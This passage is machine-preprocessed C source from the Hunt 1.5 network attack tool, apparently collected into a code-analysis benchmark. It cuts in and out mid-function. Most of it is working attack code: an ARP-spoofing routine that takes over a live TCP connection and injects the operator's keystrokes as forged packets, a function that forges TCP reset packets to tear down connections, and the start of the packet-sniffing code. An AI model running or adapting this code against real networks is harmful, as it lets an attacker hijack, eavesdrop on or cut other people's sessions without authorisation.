  int ethtap_fd ;
  int tmp ;
  int tmp___0 ;
  void *tmp___1 ;
  int tmp___2 ;
  int tmp___3 ;
  int tmp___4 ;
  int tmp___5 ;

  {
  {
#line 327
  ethtap_fd = -1;
#line 328
  relay_list_items();
#line 329
  tmp = list_count(& l_relay_db);
#line 329
  tmp___0 = list_count(& l_relay_db);
#line 329
  nr = menu_choose_unr((char *)"choose item", 0, tmp___0 - 1, tmp - 1);
  }
#line 329
  if (nr == -1) {
#line 330
    return;
  }
  {
#line 331
  tmp___1 = list_at(& l_relay_db, nr);
#line 331
  ri = (struct relay_item *)tmp___1;
  }
#line 331
  if (! ri) {
#line 332
    return;
  }
  {
#line 333
  tmp___2 = menu_choose_host_mask_ports_dfl((char *)"src ip addr/mask ports", & src_ip,
                                            & src_mask, (unsigned int *)(src_ports),
                                            ri->src_addr, ri->src_mask, (int *)(ri->src_ports));
  }
#line 333
  if (tmp___2 < 0) {
#line 336
    return;
  }
  {
#line 337
  tmp___3 = menu_choose_host_mask_ports_dfl((char *)"dst ip addr/mask ports", & dst_ip,
                                            & dst_mask, (unsigned int *)(dst_ports),
                                            ri->dst_addr, ri->dst_mask, (int *)(ri->dst_ports));
  }
#line 337
  if (tmp___3 < 0) {
#line 340
    return;
  }
  {
#line 342
  if (ri->flags == 1U) {
#line 342
    goto case_1;
  }
#line 345
  if (ri->flags == 2U) {
#line 345
    goto case_2;
  }
#line 348
  goto switch_default;
  case_1: /* CIL Label */ 
#line 343
  flags_dfl = (char )'d';
#line 344
  goto switch_break;
  case_2: /* CIL Label */ 
#line 346
  flags_dfl = (char )'e';
#line 347
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 349
  flags_dfl = (char )'n';
  switch_break: /* CIL Label */ ;
  }
  {
#line 351
  flags_c = menu_choose_char((char *)"flags: [n]one [d]rop [e]th_relay", (char *)"nde",
                             flags_dfl);
  }
#line 351
  if (flags_c < 0) {
#line 352
    return;
  }
#line 353
  if (flags_c == 101) {
    {
#line 354
    tmp___4 = menu_choose_string((char *)"eth relay device", name_buf, (int )sizeof(name_buf),
                                 ri->ethtap_name);
    }
#line 354
    if (tmp___4 < 0) {
#line 356
      return;
    }
    {
#line 357
    tmp___5 = strcmp((char const   *)(name_buf), (char const   *)ri->ethtap_name);
    }
#line 357
    if (tmp___5 != 0) {
      {
#line 358
      strcpy((char */* __restrict  */)(name_buf2), (char const   */* __restrict  */)"/dev/");
#line 359
      strcat((char */* __restrict  */)(name_buf2), (char const   */* __restrict  */)(name_buf));
#line 360
      ethtap_fd = open((char const   *)(name_buf2), 2);
      }
#line 360
      if (ethtap_fd < 0) {
        {
#line 361
        printf((char const   */* __restrict  */)"cannot open %s for read/write\n",
               name_buf2);
        }
#line 362
        return;
      }
    }
  }
  {
#line 367
  port_htons((unsigned int *)(src_ports));
#line 368
  port_htons((unsigned int *)(dst_ports));
#line 370
  ri->src_addr = src_ip;
#line 371
  ri->src_mask = src_mask;
#line 372
  memcpy((void */* __restrict  */)(ri->src_ports), (void const   */* __restrict  */)(src_ports),
         sizeof(int ) * 17UL);
#line 373
  ri->dst_addr = dst_ip;
#line 374
  ri->dst_mask = dst_mask;
#line 375
  memcpy((void */* __restrict  */)(ri->dst_ports), (void const   */* __restrict  */)(dst_ports),
         sizeof(int ) * 17UL);
  }
#line 376
  if (flags_c != 101) {
#line 376
    goto _L;
  } else
#line 376
  if (ethtap_fd >= 0) {
    _L: /* CIL Label */ 
#line 377
    if (ri->ethtap_fd >= 0) {
      {
#line 378
      close(ri->ethtap_fd);
#line 379
      ri->ethtap_fd = -1;
      }
    }
#line 381
    if (ri->ethtap_name) {
      {
#line 382
      free((void *)ri->ethtap_name);
#line 383
      ri->ethtap_name = (char *)((void *)0);
      }
    }
  }
  {
#line 387
  if (flags_c == 100) {
#line 387
    goto case_100;
  }
#line 390
  if (flags_c == 101) {
#line 390
    goto case_101;
  }
#line 397
  goto switch_default___0;
  case_100: /* CIL Label */ 
#line 388
  ri->flags = 1U;
#line 389
  goto switch_break___0;
  case_101: /* CIL Label */ 
#line 391
  ri->flags = 2U;
#line 392
  if (ethtap_fd >= 0) {
    {
#line 393
    ri->ethtap_fd = ethtap_fd;
#line 394
    ri->ethtap_name = strdup((char const   *)(name_buf));
    }
  }
#line 396
  goto switch_break___0;
  switch_default___0: /* CIL Label */ 
#line 398
  ri->flags = 0U;
  switch_break___0: /* CIL Label */ ;
  }
#line 400
  return;
}
}
#line 402 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static void relay_del_item(void) 
{ 
  int i ;
  struct relay_item *ri ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 407
  relay_list_items();
#line 408
  tmp = list_count(& l_relay_db);
#line 408
  i = menu_choose_unr((char *)"item nr. to delete", 0, tmp - 1, -1);
  }
#line 410
  if (i >= 0) {
    {
#line 411
    tmp___0 = list_remove_at(& l_relay_db, i);
#line 411
    ri = (struct relay_item *)tmp___0;
#line 412
    ri_free(ri);
    }
  }
#line 414
  return;
}
}
#line 416 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
void relay_menu(void) 
{ 
  char *r_menu ;
  char *r_keys ;
  int run_it ;
  int tmp ;

  {
#line 418
  r_menu = (char *)"l)     list relay database\na/m/d) add/mod/del entry\nx)     return\n";
#line 421
  r_keys = (char *)"ladmx";
#line 424
  run_it = 1;
  {
#line 425
  while (1) {
    while_continue: /* CIL Label */ ;
#line 425
    if (! run_it) {
#line 425
      goto while_break;
    }
    {
#line 426
    tmp = menu((char *)"relay database", r_menu, (char *)"arps/relay", r_keys, (char)0);
    }
    {
#line 427
    if (tmp == 108) {
#line 427
      goto case_108;
    }
#line 430
    if (tmp == 97) {
#line 430
      goto case_97;
    }
#line 433
    if (tmp == 100) {
#line 433
      goto case_100;
    }
#line 436
    if (tmp == 109) {
#line 436
      goto case_109;
    }
#line 439
    if (tmp == 120) {
#line 439
      goto case_120;
    }
#line 426
    goto switch_break;
    case_108: /* CIL Label */ 
    {
#line 428
    relay_list_items();
    }
#line 429
    goto switch_break;
    case_97: /* CIL Label */ 
    {
#line 431
    relay_add_item();
    }
#line 432
    goto switch_break;
    case_100: /* CIL Label */ 
    {
#line 434
    relay_del_item();
    }
#line 435
    goto switch_break;
    case_109: /* CIL Label */ 
    {
#line 437
    relay_mod_item();
    }
#line 438
    goto switch_break;
    case_120: /* CIL Label */ 
#line 440
    run_it = 0;
#line 441
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 444
  return;
}
}
#line 506 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
int arp_hijack(struct conn_info *ci , char *src_fake_mac , char *dst_fake_mac , int input_mode ) ;
#line 507
void arp_hijack_done(char *src_fake_mac , char *dst_fake_mac ) ;
#line 360 "/usr/include/unistd.h"
extern ssize_t read(int __fd , void *__buf , size_t __nbytes ) ;
#line 26 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arphijack.c"
int user_arp_hijack(struct user_conn_info *uci , char *src_fake_mac , char *dst_fake_mac ,
                    int input_mode ) 
{ 
  struct conn_info *ci ;
  int retval ;

  {
  {
#line 32
  ci = conn_get(uci);
  }
#line 32
  if (ci) {
    {
#line 36
    retval = arp_hijack(ci, src_fake_mac, dst_fake_mac, input_mode);
#line 37
    conn_free(ci);
    }
  } else {
    {
#line 33
    printf((char const   */* __restrict  */)"connection isn\'t available\n");
#line 34
    retval = 1;
    }
  }
#line 39
  return (retval);
}
}
#line 52 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arphijack.c"
static void *watch_tty(struct watch_tty_data *wtd ) 
{ 
  struct tcp_spec ts ;
  char buf[256] ;
  int nr ;
  int tmp ;
  uint16_t tmp___0 ;
  uint16_t tmp___1 ;
  ssize_t tmp___2 ;

  {
#line 58
  if (wtd->input_mode == 0) {
    {
#line 59
    tty_raw(0, 1, 0);
    }
  }
  {
#line 60
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 60
    tmp___2 = read(0, (void *)(buf), sizeof(buf));
#line 60
    nr = (int )tmp___2;
    }
#line 60
    if (! nr) {
#line 60
      goto while_break;
    }
#line 61
    if ((int )buf[0] == 29) {
#line 62
      goto while_break;
    }
#line 63
    if (wtd->input_mode == 2) {
#line 63
      goto _L;
    } else
#line 63
    if (wtd->input_mode == 1) {
      _L: /* CIL Label */ 
#line 65
      if (nr >= 3) {
#line 65
        if ((int )buf[0] == 94) {
#line 65
          if ((int )buf[1] == 93) {
#line 65
            if ((int )buf[2] == 10) {
#line 67
              goto while_break;
            }
          }
        }
      }
#line 69
      if (wtd->input_mode == 1) {
#line 69
        if ((unsigned long )nr < sizeof(buf)) {
#line 69
          if ((int )buf[nr - 1] == 10) {
#line 71
            buf[nr - 1] = (char )'\r';
#line 72
            tmp = nr;
#line 72
            nr ++;
#line 72
            buf[tmp] = (char )'\n';
          }
        }
      }
    }
    {
#line 75
    memset((void *)(& ts), 0, sizeof(ts));
#line 76
    ts.saddr = (wtd->ci)->src_addr;
#line 77
    ts.daddr = (wtd->ci)->dst_addr;
#line 78
    ts.sport = (wtd->ci)->src_port;
#line 79
    ts.dport = (wtd->ci)->dst_port;
#line 80
    ts.src_mac = wtd->src_fake_mac;
#line 81
    ts.dst_mac = (char *)((wtd->ci)->dst.src_mac);
#line 82
    ts.seq = (wtd->ci)->dst.next_d_seq;
#line 83
    ts.ack_seq = (wtd->ci)->dst.next_seq;
    }
#line 84
    if ((wtd->ci)->src.window) {
#line 84
      ts.window = (wtd->ci)->src.window;
    } else {
      {
#line 84
      tmp___0 = htons((uint16_t )242);
#line 84
      ts.window = tmp___0;
      }
    }
    {
#line 85
    tmp___1 = ntohs((wtd->ci)->src.id);
#line 85
    ts.id = htons((uint16_t )((int )tmp___1 + 1));
#line 86
    ts.ack = 1;
#line 87
    ts.psh = 1;
#line 88
    ts.rst = 0;
#line 89
    ts.data = buf;
#line 90
    ts.data_len = nr;
#line 91
    send_tcp_packet(& ts);
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 93
  if (wtd->input_mode == 0) {
    {
#line 94
    tty_reset(0);
    }
  }
  {
#line 95
  list_produce_done(& l_hijack_conn);
  }
#line 96
  return ((void *)0);
}
}
#line 99 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arphijack.c"
static struct arp_spoof_info *asi_src  ;
#line 100 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arphijack.c"
static struct arp_spoof_info *asi_dst  ;
#line 101 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arphijack.c"
static struct arp_dont_relay *dont_relay  ;
#line 103 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arphijack.c"
int arp_hijack(struct conn_info *ci , char *src_fake_mac , char *dst_fake_mac , int input_mode ) 
{ 
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  struct tcp_spec ts ;
  struct ifunc_item ifunc_dst ;
  struct ifunc_item ifunc_src ;
  struct packet *p ;
  int count_dst ;
  int count_src ;
  pthread_t thr_tty ;
  struct watch_tty_data wtd ;
  char *tmp ;
  char *tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;
  char *tmp___3 ;
  char *tmp___4 ;
  int tmp___5 ;
  int tmp___6 ;
  uint16_t tmp___7 ;
  uint16_t tmp___8 ;
  uint16_t tmp___9 ;
  uint16_t tmp___10 ;
  void *tmp___11 ;

  {
  {
#line 111
  count_dst = 0;
#line 111
  count_src = 0;
#line 115
  asi_dst = (struct arp_spoof_info *)((void *)0);
#line 115
  asi_src = asi_dst;
#line 117
  dont_relay = arp_dont_relay_insert((unsigned int )ci->src_addr, (unsigned int )ci->dst_addr,
                                     (unsigned int )ci->src_port, (unsigned int )ci->dst_port);
  }
#line 119
  if (src_fake_mac) {
    {
#line 120
    asi_src = start_arp_spoof((unsigned int )ci->src_addr, (unsigned int )ci->dst_addr,
                              (char *)((void *)0), (char *)((void *)0), (char *)((void *)0),
                              0, 0, 0);
    }
#line 120
    if (! asi_src) {
      {
#line 121
      asi_src = start_arp_spoof((unsigned int )ci->src_addr, (unsigned int )ci->dst_addr,
                                (char *)(ci->src.src_mac), (char *)(ci->dst.src_mac),
                                src_fake_mac, 0, 0, 0);
      }
    }
  } else {
    {
#line 126
    asi_src = get_arp_spoof((unsigned int )ci->src_addr, (unsigned int )ci->dst_addr);
    }
  }
#line 127
  if (asi_src) {
    {
#line 127
    tmp___2 = user_arpspoof_test(asi_src);
    }
#line 127
    if (tmp___2) {
      {
#line 128
      tmp___1 = user_run_arpspoof_until_successed(asi_src);
      }
#line 128
      if (tmp___1) {
        {
#line 129
        set_tty_color((enum TTY_COLOR )9);
#line 130
        tmp = host_lookup(asi_src->dst_addr, hl_mode);
#line 130
        tmp___0 = host_lookup(asi_src->src_addr, hl_mode);
#line 130
        printf((char const   */* __restrict  */)"ARP spoof of %s in host %s FAILED\n",
               tmp___0, tmp);
#line 133
        set_tty_color((enum TTY_COLOR )7);
#line 134
        fflush(stdout);
        }
#line 135
        if (src_fake_mac) {
          {
#line 136
          stop_arp_spoof(asi_src);
          }
        }
#line 137
        asi_src = (struct arp_spoof_info *)((void *)0);
      }
    }
  }
#line 140
  if (dst_fake_mac) {
    {
#line 141
    asi_dst = start_arp_spoof((unsigned int )ci->dst_addr, (unsigned int )ci->src_addr,
                              (char *)((void *)0), (char *)((void *)0), (char *)((void *)0),
                              0, 0, 0);
    }
#line 141
    if (! asi_dst) {
      {
#line 142
      asi_dst = start_arp_spoof((unsigned int )ci->dst_addr, (unsigned int )ci->src_addr,
                                (char *)(ci->dst.src_mac), (char *)(ci->src.src_mac),
                                dst_fake_mac, 0, 0, 0);
      }
    }
  } else {
    {
#line 147
    asi_dst = get_arp_spoof((unsigned int )ci->dst_addr, (unsigned int )ci->src_addr);
    }
  }
#line 149
  if (asi_dst) {
    {
#line 149
    tmp___6 = user_arpspoof_test(asi_dst);
    }
#line 149
    if (tmp___6) {
      {
#line 150
      tmp___5 = user_run_arpspoof_until_successed(asi_dst);
      }
#line 150
      if (tmp___5) {
        {
#line 151
        set_tty_color((enum TTY_COLOR )9);
#line 152
        tmp___3 = host_lookup(asi_dst->dst_addr, hl_mode);
#line 152
        tmp___4 = host_lookup(asi_dst->src_addr, hl_mode);
#line 152
        printf((char const   */* __restrict  */)"ARP spoof of %s in host %s FAILED\n",
               tmp___4, tmp___3);
#line 155
        set_tty_color((enum TTY_COLOR )7);
#line 156
        fflush(stdout);
        }
#line 157
        if (dst_fake_mac) {
          {
#line 158
          stop_arp_spoof(asi_dst);
          }
        }
#line 159
        asi_dst = (struct arp_spoof_info *)((void *)0);
      }
    }
  }
  {
#line 162
  set_tty_color((enum TTY_COLOR )15);
#line 163
  printf((char const   */* __restrict  */)"you took over the connection\n");
#line 164
  set_tty_color((enum TTY_COLOR )9);
#line 165
  printf((char const   */* __restrict  */)"CTRL-] to break\n");
#line 166
  set_tty_color((enum TTY_COLOR )7);
#line 167
  fflush(stdout);
  }
#line 169
  if (asi_src) {
#line 169
    wtd.src_fake_mac = (char *)(asi_src->src_fake_mac);
  } else {
#line 169
    wtd.src_fake_mac = (char *)(ci->src.src_mac);
  }
  {
#line 170
  wtd.ci = ci;
#line 171
  wtd.input_mode = input_mode;
#line 173
  list_produce_start(& l_hijack_conn);
#line 174
  pthread_create((pthread_t */* __restrict  */)(& thr_tty), (pthread_attr_t const   */* __restrict  */)((void *)0),
                 (void *(*)(void * ))(& watch_tty), (void */* __restrict  */)(& wtd));
#line 176
  ifunc_dst.func = (void (*)(struct packet * , void * ))(& func_hijack_dst);
#line 177
  ifunc_dst.arg = (void *)ci;
#line 178
  list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_dst));
#line 179
  ifunc_src.func = (void (*)(struct packet * , void * ))(& func_hijack_src);
#line 180
  ifunc_src.arg = (void *)ci;
#line 181
  list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_src));
  }
  {
#line 183
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 183
    tmp___11 = list_consume(& l_hijack_conn, (struct timespec  const  *)((void *)0));
#line 183
    p = (struct packet *)tmp___11;
    }
#line 183
    if (! p) {
#line 183
      goto while_break;
    }
#line 184
    iph = p->p_iph;
#line 185
    tcph = p->p_hdr.p_tcph;
#line 186
    if ((unsigned long )iph->saddr == ci->dst_addr) {
#line 186
      if ((unsigned long )iph->daddr == ci->src_addr) {
#line 186
        if ((int )tcph->__annonCompField3.__annonCompField2.source == (int )ci->dst_port) {
#line 186
          if ((int )tcph->__annonCompField3.__annonCompField2.dest == (int )ci->src_port) {
#line 191
            if (p->p_data_len) {
              {
#line 192
              count_dst ++;
#line 192
              print_data_packet(p, p->p_data_len, count_dst, 1);
#line 193
              packet_free(p);
#line 195
              memset((void *)(& ts), 0, sizeof(ts));
#line 196
              ts.saddr = ci->src_addr;
#line 197
              ts.daddr = ci->dst_addr;
#line 198
              ts.sport = ci->src_port;
#line 199
              ts.dport = ci->dst_port;
              }
#line 200
              if (asi_src) {
#line 200
                ts.src_mac = (char *)(asi_src->src_fake_mac);
              } else {
#line 200
                ts.src_mac = (char *)(ci->src.src_mac);
              }
#line 202
              ts.dst_mac = (char *)(ci->dst.src_mac);
#line 203
              ts.seq = ci->dst.next_d_seq;
#line 204
              ts.ack_seq = ci->dst.next_seq;
#line 205
              if (ci->src.window) {
#line 205
                ts.window = ci->src.window;
              } else {
                {
#line 205
                tmp___7 = htons((uint16_t )242);
#line 205
                ts.window = tmp___7;
                }
              }
              {
#line 206
              tmp___8 = ntohs(ci->src.id);
#line 206
              ts.id = htons((uint16_t )((int )tmp___8 + 1));
#line 207
              ts.ack = 1;
#line 208
              ts.psh = 1;
#line 209
              ts.rst = 0;
#line 210
              ts.data = (char *)((void *)0);
#line 211
              ts.data_len = 0;
#line 212
              send_tcp_packet(& ts);
              }
            } else {
              {
#line 214
              packet_free(p);
              }
            }
          } else {
#line 186
            goto _L___1;
          }
        } else {
#line 186
          goto _L___1;
        }
      } else {
#line 186
        goto _L___1;
      }
    } else {
      _L___1: /* CIL Label */ 
#line 216
      if (p->p_data_len) {
        {
#line 218
        count_src ++;
#line 218
        print_data_packet(p, p->p_data_len, count_src, 0);
#line 219
        memset((void *)(& ts), 0, sizeof(ts));
#line 220
        ts.saddr = ci->dst_addr;
#line 221
        ts.daddr = ci->src_addr;
#line 222
        ts.sport = ci->dst_port;
#line 223
        ts.dport = ci->src_port;
        }
#line 224
        if (asi_dst) {
#line 224
          ts.src_mac = (char *)(asi_dst->src_fake_mac);
        } else {
#line 224
          ts.src_mac = (char *)(ci->dst.src_mac);
        }
#line 226
        ts.dst_mac = (char *)(ci->src.src_mac);
#line 227
        ts.seq = ci->src.next_d_seq;
#line 228
        ts.ack_seq = ci->src.next_seq;
#line 229
        if (ci->dst.window) {
#line 229
          ts.window = ci->dst.window;
        } else {
          {
#line 229
          tmp___9 = htons((uint16_t )242);
#line 229
          ts.window = tmp___9;
          }
        }
        {
#line 231
        tmp___10 = ntohs(ci->dst.id);
#line 231
        ts.id = htons((uint16_t )((int )tmp___10 + 1));
#line 232
        ts.ack = 1;
#line 233
        ts.psh = 1;
#line 234
        ts.rst = 0;
        }
#line 235
        if ((int )*(p->p_data + 0) == 13) {
#line 236
          ts.data = (char *)"\r\n$ ";
#line 237
          ts.data_len = 4;
        } else
#line 235
        if ((int )*(p->p_data + 0) == 10) {
#line 236
          ts.data = (char *)"\r\n$ ";
#line 237
          ts.data_len = 4;
        } else {
#line 239
          ts.data = p->p_data;
#line 240
          ts.data_len = p->p_data_len;
        }
        {
#line 242
        send_tcp_packet(& ts);
        }
      }
      {
#line 244
      packet_free(p);
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 247
  list_remove(& l_ifunc_tcp, (void *)(& ifunc_dst));
#line 248
  list_remove(& l_ifunc_tcp, (void *)(& ifunc_src));
#line 249
  packet_flush(& l_hijack_conn);
#line 250
  pthread_join(thr_tty, (void **)((void *)0));
  }
#line 252
  return (0);
}
}
#line 256 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arphijack.c"
void user_arp_hijack_done(char *src_fake_mac , char *dst_fake_mac ) 
{ 


  {
  {
#line 258
  arp_hijack_done(src_fake_mac, dst_fake_mac);
  }
#line 259
  return;
}
}
#line 261 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arphijack.c"
void arp_hijack_done(char *src_fake_mac , char *dst_fake_mac ) 
{ 


  {
  {
#line 263
  arp_dont_relay_remove(dont_relay);
  }
#line 264
  if (asi_src) {
#line 264
    if (src_fake_mac) {
      {
#line 265
      stop_arp_spoof(asi_src);
      }
    }
  }
#line 267
  asi_src = (struct arp_spoof_info *)((void *)0);
#line 268
  if (asi_dst) {
#line 268
    if (dst_fake_mac) {
      {
#line 269
      stop_arp_spoof(asi_dst);
      }
    }
  }
#line 271
  asi_dst = (struct arp_spoof_info *)((void *)0);
#line 272
  return;
}
}
#line 20 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rst.c"
void user_rst(struct user_conn_info *uci , int count___0 , int mode ) 
{ 
  struct conn_info *ci ;
  unsigned int key ;

  {
  {
#line 25
  ci = conn_get(uci);
  }
#line 25
  if (ci) {
    {
#line 29
    if (mode == 2) {
#line 29
      goto case_2;
    }
#line 33
    if (mode == 0) {
#line 33
      goto case_0;
    }
#line 36
    if (mode == 1) {
#line 36
      goto case_1;
    }
#line 28
    goto switch_break;
    case_2: /* CIL Label */ 
    {
#line 30
    rst(ci, count___0, 0);
#line 31
    rst(ci, count___0, 1);
    }
#line 32
    goto switch_break;
    case_0: /* CIL Label */ 
    {
#line 34
    rst(ci, count___0, 0);
    }
#line 35
    goto switch_break;
    case_1: /* CIL Label */ 
    {
#line 37
    rst(ci, count___0, 1);
    }
#line 38
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
    {
#line 44
    key = uci_generate_key(uci);
#line 45
    hash_remove(& conn_table, key, (void *)uci);
#line 46
    conn_free(ci);
    }
  } else {
    {
#line 26
    printf((char const   */* __restrict  */)"connection isn\'t available\n");
    }
  }
#line 48
  return;
}
}
#line 50 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rst.c"
void rst(struct conn_info *ci , int count___0 , int rstdst ) 
{ 
  struct tcp_spec ts ;
  int i ;
  uint16_t tmp ;
  uint16_t tmp___0 ;
  uint32_t tmp___1 ;
  uint32_t tmp___2 ;
  uint32_t tmp___3 ;
  uint32_t tmp___4 ;
  uint32_t tmp___5 ;
  uint32_t tmp___6 ;
  uint32_t tmp___7 ;
  uint32_t tmp___8 ;

  {
#line 55
  if (rstdst) {
#line 56
    ts.saddr = ci->src_addr;
#line 57
    ts.daddr = ci->dst_addr;
#line 58
    ts.sport = ci->src_port;
#line 59
    ts.dport = ci->dst_port;
#line 60
    ts.src_mac = (char *)(ci->dst.dst_mac);
#line 61
    ts.dst_mac = (char *)(ci->dst.src_mac);
#line 62
    if (ci->src.window) {
#line 62
      ts.window = ci->src.window;
    } else {
      {
#line 62
      tmp = htons((uint16_t )242);
#line 62
      ts.window = tmp;
      }
    }
#line 63
    ts.id = ci->src.id;
  } else {
#line 65
    ts.saddr = ci->dst_addr;
#line 66
    ts.daddr = ci->src_addr;
#line 67
    ts.sport = ci->dst_port;
#line 68
    ts.dport = ci->src_port;
#line 69
    ts.src_mac = (char *)(ci->src.dst_mac);
#line 70
    ts.dst_mac = (char *)(ci->src.src_mac);
#line 71
    if (ci->dst.window) {
#line 71
      ts.window = ci->dst.window;
    } else {
      {
#line 71
      tmp___0 = htons((uint16_t )242);
#line 71
      ts.window = tmp___0;
      }
    }
#line 72
    ts.id = ci->dst.id;
  }
#line 74
  ts.ack = 1;
#line 75
  ts.rst = 1;
#line 76
  ts.psh = 0;
#line 77
  ts.data = (char *)((void *)0);
#line 78
  ts.data_len = 0;
#line 79
  i = 0;
  {
#line 79
  while (1) {
    while_continue: /* CIL Label */ ;
#line 79
    if (! (i < count___0)) {
#line 79
      goto while_break;
    }
#line 80
    if (rstdst) {
      {
#line 81
      tmp___1 = ntohl((uint32_t )ci->dst.next_d_seq);
#line 81
      tmp___2 = htonl(tmp___1 + (uint32_t )i);
#line 81
      ts.seq = (unsigned long )tmp___2;
#line 82
      tmp___3 = ntohl((uint32_t )ci->dst.next_seq);
#line 82
      tmp___4 = htonl(tmp___3 + (uint32_t )i);
#line 82
      ts.ack_seq = (unsigned long )tmp___4;
      }
    } else {
      {
#line 84
      tmp___5 = ntohl((uint32_t )ci->src.next_d_seq);
#line 84
      tmp___6 = htonl(tmp___5 + (uint32_t )i);
#line 84
      ts.seq = (unsigned long )tmp___6;
#line 85
      tmp___7 = ntohl((uint32_t )ci->src.next_seq);
#line 85
      tmp___8 = htonl(tmp___7 + (uint32_t )i);
#line 85
      ts.ack_seq = (unsigned long )tmp___8;
      }
    }
    {
#line 87
    send_tcp_packet(& ts);
#line 79
    i ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 89
  return;
}
}
#line 209 "/usr/include/x86_64-linux-gnu/sys/stat.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1,2), __leaf__)) stat)(char const   * __restrict  __file ,
                                                                                             struct stat * __restrict  __buf ) ;
#line 321
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1), __leaf__)) mkdir)(char const   *__path ,
                                                                                            __mode_t __mode ) ;
#line 237 "/usr/include/stdio.h"
extern int fclose(FILE *__stream ) ;
#line 272
extern FILE *fopen(char const   * __restrict  __filename , char const   * __restrict  __modes ) ;
#line 573
extern int fputc(int __c , FILE *__stream ) ;
#line 96 "/usr/include/string.h"
extern  __attribute__((__nothrow__)) void *( __attribute__((__nonnull__(1), __leaf__)) memchr)(void const   *__s ,
                                                                                               int __c ,
                                                                                               size_t __n )  __attribute__((__pure__)) ;
#line 21 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
int o_newline  =    0;
#line 62 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static struct ifunc_item ifunc_sniff  ;
#line 63 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static int sniffer_running  =    0;
#line 64 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static struct list l_sniff_pkt  = 
#line 64
     {(void *)0, (void *)0, (int )((char *)(& ((struct packet *)0)->p_next[4]) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 65 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static pthread_t sniff_thr  ;
#line 66 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static struct list l_sniff_db  = 
#line 66
     {(void *)0, (void *)0, (int )((char *)(& ((struct sniff_log *)0)->next) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 73 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void sniff_info_want(struct sniff_info *si ) 
{ 


  {
  {
#line 75
  pthread_mutex_lock(& si->mutex);
#line 76
  (si->lock_count) ++;
#line 77
  pthread_mutex_unlock(& si->mutex);
  }
#line 78
  return;
}
}
#line 80 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void sniff_info_release(struct sniff_info *si ) 
{ 


  {
  {
#line 82
  pthread_mutex_lock(& si->mutex);
#line 83
  (si->lock_count) --;
  }
#line 83
  if (si->lock_count == 0) {
    {
#line 84
    pthread_cond_broadcast(& si->lock_cond);
    }
  }
  {
#line 85
  pthread_mutex_unlock(& si->mutex);
  }
#line 86
  return;
}
}
#line 88 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void sniff_info_wait_for_release(struct sniff_info *si ) 
{ 


  {
  {
#line 90
  pthread_mutex_lock(& si->mutex);
  }
  {
#line 91
  while (1) {
    while_continue: /* CIL Label */ ;
#line 91
    if (! (si->lock_count > 0)) {
#line 91
      goto while_break;
    }
    {
#line 92
    pthread_cond_wait((pthread_cond_t */* __restrict  */)(& si->lock_cond), (pthread_mutex_t */* __restrict  */)(& si->mutex));
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 93
  pthread_mutex_unlock(& si->mutex);
  }
#line 94
  return;
}
}
#line 97 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
void free_sniff_log(struct sniff_log *slog ) 
{ 


  {
#line 99
  if (slog->buf) {
    {
#line 100
    free((void *)slog->buf);
    }
  }
#line 101
  if (slog->file_close) {
    {
#line 102
    fclose(slog->file);
    }
  }
  {
#line 103
  free((void *)slog);
  }
#line 104
  return;
}
}
#line 106 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
void free_sniff_info(struct sniff_info *si ) 
{ 
  struct sniff_log *slog ;
  void *tmp ;

  {
#line 110
  if (si->search) {
    {
#line 111
    free((void *)si->search);
    }
  }
  {
#line 112
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 112
    tmp = list_pop(& si->log);
#line 112
    slog = (struct sniff_log *)tmp;
    }
#line 112
    if (! slog) {
#line 112
      goto while_break;
    }
    {
#line 113
    free_sniff_log(slog);
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 114
